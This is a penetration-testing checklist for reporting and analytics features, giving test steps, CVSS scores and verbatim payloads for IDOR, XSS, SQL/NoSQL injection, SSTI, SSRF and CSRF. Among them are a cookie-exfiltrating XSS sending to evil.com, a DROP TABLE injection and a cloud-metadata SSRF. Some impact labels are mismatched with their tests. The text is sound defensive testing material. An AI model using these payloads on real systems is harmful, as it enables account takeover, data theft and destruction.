# 14. Reporting & Analytics — Checklist

Feature-area security **test cases** for “14. Reporting & Analytics”. Functionality-driven checklist mapped to the per-attack kits; impact-first with severity + CVSS.

*263 test cases. Source: expert checklist matrix (12/14-col). Payloads shown verbatim in code blocks.*

---

## RPT-001 — Dashboard IDOR Access
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Dashboard / Overview

**Test Steps:** 1. Access own dashboard 2. Intercept request 3. Modify dashboard_id or user_id parameter 4. Access another user's dashboard

**Expected Result:** Application should verify dashboard ownership

**Payload Example:**

```
GET /api/dashboards/victim_dashboard_id or /dashboard?user_id=victim_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-002 — Dashboard Data IDOR
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Dashboard / Overview

**Test Steps:** 1. View dashboard data 2. Modify organization_id parameter 3. Access another organization's metrics 4. View competitor data

**Expected Result:** Dashboard data should be tenant-scoped

**Payload Example:**

```
GET /api/dashboard/data?org_id=victim_org_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-003 — Dashboard Widget Injection XSS
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Dashboard / Overview

**Test Steps:** 1. Create custom widget 2. Inject XSS in widget title or config 3. Save dashboard 4. View dashboard

**Expected Result:** Widget content should be sanitized

**Payload Example:**

```
<script>document.location='http://evil.com/?c='+document.cookie</script>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## RPT-004 — Dashboard SQL Injection in Date Filter
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Dashboard / Overview

**Test Steps:** 1. Apply date filter on dashboard 2. Intercept request 3. Inject SQL in date parameter 4. Extract database data

**Expected Result:** Date parameters should be parameterized

**Payload Example:**

```
date_from=2024-01-01'; SELECT * FROM users--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## RPT-005 — Dashboard NoSQL Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Dashboard / Overview

**Test Steps:** 1. Apply dashboard filter 2. Inject NoSQL operators 3. Bypass filter restrictions 4. Access all data

**Expected Result:** NoSQL queries should be sanitized

**Payload Example:**

```
{"filter":{"$gt":"",user_id:{"$ne":null}}}
```

**Impact:** NoSQL operator injection -&gt; authentication bypass / cross-user data disclosure.

**Tools:** NoSQLMap / Burp Suite

**References:** CWE-943; -&gt;[NoSQL Injection checklist](#/checklist/nosqli); PortSwigger NoSQL injection

---

## RPT-006 — Dashboard Privilege Escalation
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Dashboard / Overview

**Test Steps:** 1. Login as regular user 2. Access admin dashboard endpoints 3. View admin-only metrics 4. Access sensitive data

**Expected Result:** Dashboard access should check user role

**Payload Example:**

```
GET /api/admin/dashboard as regular user
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-007 — Dashboard Configuration IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Dashboard / Overview

**Test Steps:** 1. Edit own dashboard config 2. Modify dashboard_id 3. Edit another user's configuration 4. Modify their layout

**Expected Result:** Config changes should verify ownership

**Payload Example:**

```
PUT /api/dashboards/victim_id/config
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-008 — Dashboard Deletion IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Dashboard / Overview

**Test Steps:** 1. Delete own dashboard 2. Modify dashboard_id 3. Delete another user's dashboard 4. Destroy their analytics

**Expected Result:** Deletion should verify ownership

**Payload Example:**

```
DELETE /api/dashboards/victim_dashboard_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-009 — Dashboard CSRF
**Test Category:** Cross-Site Request Forgery · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Dashboard / Overview

**Test Steps:** 1. Create malicious page 2. Auto-submit dashboard modification 3. User visits page 4. Dashboard altered without consent

**Expected Result:** Dashboard operations should have CSRF protection

**Payload Example:**

```
<form action="/dashboard/update" method="POST"><input name="layout" value="malicious"></form>
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite CSRF PoC / Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## RPT-010 — Dashboard Data Cache Poisoning
**Test Category:** Web Cache Poisoning · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Dashboard / Overview

**Test Steps:** 1. Request dashboard data 2. Inject via unkeyed headers 3. Poison cache 4. Serve malicious data to others

**Expected Result:** Dashboard cache should be user-specific

**Payload Example:**

```
X-Forwarded-Host: evil.com in dashboard request
```

**Impact:** Web cache poisoning/deception -&gt; mass XSS/redirect or private-data disclosure.

**Tools:** Burp Suite / Param Miner

**References:** CWE-524; -&gt;[Web Cache Poisoning checklist](#/checklist/webcache); James Kettle Web Cache Poisoning/Deception

---

## RPT-011 — Dashboard API Rate Limiting Bypass
**Test Category:** Security Bypass · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Dashboard / Overview

**Test Steps:** 1. Query dashboard API rapidly 2. Bypass rate limits 3. Scrape all metrics 4. Data exfiltration

**Expected Result:** Rate limiting should be robust

**Payload Example:**

```
X-Forwarded-For rotation for dashboard API
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite / IP Rotate

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## RPT-012 — Dashboard Sensitive Data Exposure
**Test Category:** Information Disclosure · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Dashboard / Overview

**Test Steps:** 1. View dashboard API response 2. Analyze returned data 3. Find sensitive fields 4. Extract PII or secrets

**Expected Result:** Only necessary data should be returned

**Payload Example:**

```
API response containing user emails or internal IDs
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## RPT-013 — Dashboard Template Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Dashboard / Overview

**Test Steps:** 1. Create dashboard with template syntax 2. Save and render 3. Check for code execution 4. Server compromise

**Expected Result:** Dashboard content should not be templated

**Payload Example:**

```
{{7*7}} or ${constructor.constructor('return this')()}
```

**Impact:** Server-side template injection -&gt; remote code execution on the app server.

**Tools:** Burp Suite / Tplmap

**References:** CWE-1336; -&gt;[SSTI checklist](#/checklist/ssti); PortSwigger SSTI (James Kettle)

---

## RPT-014 — Dashboard WebSocket Hijacking
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Dashboard / Overview

**Test Steps:** 1. Connect to real-time dashboard WebSocket 2. Modify connection parameters 3. Access other users' live data 4. Monitor their activity

**Expected Result:** WebSocket should verify user authorization

**Payload Example:**

```
WS connection without proper auth token
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / WS King

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-015 — Dashboard Widget SSRF
**Test Category:** Server-Side Request Forgery · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Dashboard / Overview

**Test Steps:** 1. Add widget with external data source 2. Provide internal URL 3. Widget fetches internal resource 4. Access internal services

**Expected Result:** Widget URLs should be validated

**Payload Example:**

```
widget_url=http://169.254.169.254/latest/meta-data/
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite / SSRFmap

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## RPT-016 — Report IDOR Access
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Custom Reports

**Test Steps:** 1. Access own report 2. Modify report_id parameter 3. Access another user's report 4. View their private data

**Expected Result:** Report access should verify ownership

**Payload Example:**

```
GET /api/reports/victim_report_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-017 — Report IDOR Modification
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Custom Reports

**Test Steps:** 1. Edit own report 2. Change report_id 3. Modify another user's report 4. Alter their analytics

**Expected Result:** Report modification should verify ownership

**Payload Example:**

```
PUT /api/reports/victim_report_id {"name":"hacked"}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-018 — Report IDOR Deletion
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Custom Reports

**Test Steps:** 1. Delete own report 2. Modify report_id 3. Delete another user's report 4. Destroy their work

**Expected Result:** Deletion should verify ownership

**Payload Example:**

```
DELETE /api/reports/victim_report_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-019 — Report SQL Injection in Query Builder
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Custom Reports

**Test Steps:** 1. Build custom report query 2. Inject SQL in field selection 3. Execute malicious query 4. Extract all data

**Expected Result:** Query builder should use parameterized queries

**Payload Example:**

```
SELECT * FROM users WHERE 1=1; DROP TABLE reports--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## RPT-020 — Report Column Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Custom Reports

**Test Steps:** 1. Select columns for report 2. Inject SQL in column name 3. Access unauthorized columns 4. Data breach

**Expected Result:** Column names should be validated against whitelist

**Payload Example:**

```
columns=id,name,(SELECT password FROM users)
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## RPT-021 — Report Filter SQL Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Custom Reports

**Test Steps:** 1. Add filter to report 2. Inject SQL in filter value 3. Bypass filter logic 4. Access all data

**Expected Result:** Filters should be parameterized

**Payload Example:**

```
filter_value='; OR '1'='1'--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## RPT-022 — Report Stored XSS in Name
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Custom Reports

**Test Steps:** 1. Create report with XSS in name 2. Save report 3. User views report list 4. XSS executes

**Expected Result:** Report names should be sanitized

**Payload Example:**

```
<script>alert(document.cookie)</script>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## RPT-023 — Report Stored XSS in Description
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Custom Reports

**Test Steps:** 1. Add XSS to report description 2. Save report 3. Description displayed 4. Script executes

**Expected Result:** Descriptions should be sanitized

**Payload Example:**

```
<img src=x onerror=alert('XSS')>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## RPT-024 — Report Query Complexity DoS
**Test Category:** Denial of Service · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Custom Reports

**Test Steps:** 1. Create complex report query 2. Join many tables 3. Execute report 4. Exhaust server resources

**Expected Result:** Query complexity should be limited

**Payload Example:**

```
Report with 50 table joins and no limits
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## RPT-025 — Report Data Source IDOR
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Custom Reports

**Test Steps:** 1. Create report with data source 2. Modify data_source_id 3. Access unauthorized data source 4. View other tenant's data

**Expected Result:** Data sources should be tenant-scoped

**Payload Example:**

```
{"data_source_id":"victim_tenant_source"}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-026 — Report Clone IDOR
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Custom Reports

**Test Steps:** 1. Clone own report 2. Modify source_id 3. Clone another user's report 4. Steal their report design

**Expected Result:** Clone should verify source ownership

**Payload Example:**

```
POST /api/reports/victim_report/clone
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-027 — Report Scheduling Privilege Escalation
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Custom Reports

**Test Steps:** 1. Schedule report as regular user 2. Access admin scheduling features 3. Schedule to restricted recipients 4. Information disclosure

**Expected Result:** Scheduling should check permissions

**Payload Example:**

```
Schedule report to admin-only distribution list
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-028 — Report Template Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Custom Reports

**Test Steps:** 1. Create report with template syntax 2. Render report 3. Template executes 4. Code execution

**Expected Result:** Report templates should be sandboxed

**Payload Example:**

```
{{config}} or ${7*'7'} in report content
```

**Impact:** Server-side template injection -&gt; remote code execution on the app server.

**Tools:** Burp Suite / Tplmap

**References:** CWE-1336; -&gt;[SSTI checklist](#/checklist/ssti); PortSwigger SSTI (James Kettle)

---

## RPT-029 — Report Calculation Formula Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Custom Reports

**Test Steps:** 1. Create calculated field 2. Inject malicious formula 3. Formula executes 4. Information disclosure

**Expected Result:** Formulas should be parsed safely

**Payload Example:**

```
formula=eval(system('id'))
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Postman

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## RPT-030 — Report Mass Assignment
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Custom Reports

**Test Steps:** 1. Create report 2. Add extra parameters 3. Modify restricted fields 4. Bypass access controls

**Expected Result:** Only allowed fields should be accepted

**Payload Example:**

```
{"name":"test",is_public:true,owner_id:"admin"}
```

**Impact:** Mass assignment / parameter pollution -&gt; privilege escalation (role/isAdmin/isVerified) or ownership takeover.

**Tools:** Burp Suite / Postman / Arjun

**References:** CWE-915; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Mass assignment; OWASP API3 BOPLA

---

## RPT-031 — Chart XSS via Data Labels
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Data Visualization / Charts

**Test Steps:** 1. Create chart with data containing XSS 2. Render chart 3. Labels displayed 4. XSS executes

**Expected Result:** Chart labels should be sanitized

**Payload Example:**

```
Data label: <script>alert(1)</script>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## RPT-032 — Chart XSS via Tooltip
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Data Visualization / Charts

**Test Steps:** 1. Add tooltip with XSS 2. Hover over chart 3. Tooltip renders 4. Script executes

**Expected Result:** Tooltips should be sanitized

**Payload Example:**

```
Tooltip: <img src=x onerror=alert('XSS')>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## RPT-033 — Chart SVG XSS
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Data Visualization / Charts

**Test Steps:** 1. Export chart as SVG 2. Inject script in SVG 3. View SVG 4. XSS executes

**Expected Result:** SVG export should sanitize scripts

**Payload Example:**

```
<svg onload=alert('XSS')> in chart data
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## RPT-034 — Chart Data IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Data Visualization / Charts

**Test Steps:** 1. Request chart data 2. Modify chart_id 3. Access another user's chart data 4. View private metrics

**Expected Result:** Chart data should verify ownership

**Payload Example:**

```
GET /api/charts/victim_chart_id/data
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-035 — Chart SQL Injection in Aggregation
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Data Visualization / Charts

**Test Steps:** 1. Select aggregation function 2. Inject SQL in function 3. Execute malicious aggregation 4. Data extraction

**Expected Result:** Aggregation functions should be whitelisted

**Payload Example:**

```
aggregation=SUM(1); SELECT * FROM users--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## RPT-036 — Chart Real-Time Data WebSocket Injection
**Test Category:** Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Data Visualization / Charts

**Test Steps:** 1. Connect to chart WebSocket 2. Inject malicious data 3. Data displayed on chart 4. XSS or manipulation

**Expected Result:** WebSocket data should be validated

**Payload Example:**

```
Inject XSS via WebSocket message
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / WS King

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## RPT-037 — Chart Rendering DoS
**Test Category:** Denial of Service · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Data Visualization / Charts

**Test Steps:** 1. Create chart with millions of data points 2. Request render 3. Browser crashes 4. Client-side DoS

**Expected Result:** Data point limits should be enforced

**Payload Example:**

```
Chart with 10 million data points
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## RPT-038 — Chart Image Export SSRF
**Test Category:** Server-Side Request Forgery · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Data Visualization / Charts

**Test Steps:** 1. Export chart as image 2. Inject external URL in chart config 3. Server fetches URL 4. SSRF

**Expected Result:** Image export should not fetch external URLs

**Payload Example:**

```
chart_background=http://internal-service:8080
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite / SSRFmap

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## RPT-039 — Chart Configuration IDOR
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Data Visualization / Charts

**Test Steps:** 1. Save chart configuration 2. Modify config_id 3. Access another user's config 4. View their settings

**Expected Result:** Config access should verify ownership

**Payload Example:**

```
GET /api/charts/configs/victim_config_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-040 — Chart Drill-Down Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Data Visualization / Charts

**Test Steps:** 1. Click chart for drill-down 2. Modify drill-down parameter 3. Inject SQL 4. Access unauthorized data

**Expected Result:** Drill-down queries should be parameterized

**Payload Example:**

```
drill_param='; SELECT * FROM sensitive_data--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## RPT-041 — Chart Color Code Injection
**Test Category:** Cross-Site Scripting · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Data Visualization / Charts

**Test Steps:** 1. Set custom color code 2. Inject script in color value 3. Color processed 4. XSS executes

**Expected Result:** Color values should be validated

**Payload Example:**

```
color="red"><script>alert(1)</script>"
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## RPT-042 — Chart Legend XSS
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Data Visualization / Charts

**Test Steps:** 1. Create chart with XSS in series name 2. Legend displays 3. XSS in legend 4. Script executes

**Expected Result:** Legend content should be sanitized

**Payload Example:**

```
Series name: <svg/onload=alert(1)>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## RPT-043 — Chart Axis Label Injection
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Data Visualization / Charts

**Test Steps:** 1. Set custom axis labels 2. Inject XSS in label 3. Axis renders 4. XSS executes

**Expected Result:** Axis labels should be sanitized

**Payload Example:**

```
x_axis_label=<script>stealCookies()</script>
```

